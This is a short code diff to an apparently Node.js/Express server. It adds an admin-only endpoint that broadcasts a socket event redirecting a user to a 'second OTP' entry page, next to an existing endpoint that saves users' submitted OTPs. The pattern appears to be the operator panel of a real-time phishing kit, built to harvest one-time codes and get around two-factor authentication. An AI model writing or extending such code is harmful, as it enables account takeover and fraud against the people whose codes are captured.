@@ -442,6 +442,29 @@ app.post('/api/users/save-second-otp', async (req, res) => {
   }
 });
 
+// Admin requests user to enter second OTP - REDIRECTS USER (NEW ENDPOINT)
+app.post('/api/admin/request-second-otp', authenticateJWT, async (req, res) => {
+  try {
+    const { email } = req.body;
+    if (!email) return res.status(400).json({ error: 'Email required' });
+    
+    console.log('🔔 Admin requested second OTP for user:', email);
+    
+    // Emit socket event to redirect user to second OTP page
+    io.emit('redirect-to-second-otp', { 
+      email,
+      redirectUrl: `/users/otp?email=${encodeURIComponent(email)}&type=second`,
+      timestamp: new Date(),
+      message: '📱 Please enter your second OTP'
+    });
+    
+    res.json({ success: true, message: 'Second OTP request sent to user' });
+  } catch (error) {
+    console.error('❌ Request second OTP error:', error.message);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
 // Reset OTP process
 app.post('/api/users/reset', async (req, res) => {
   try {
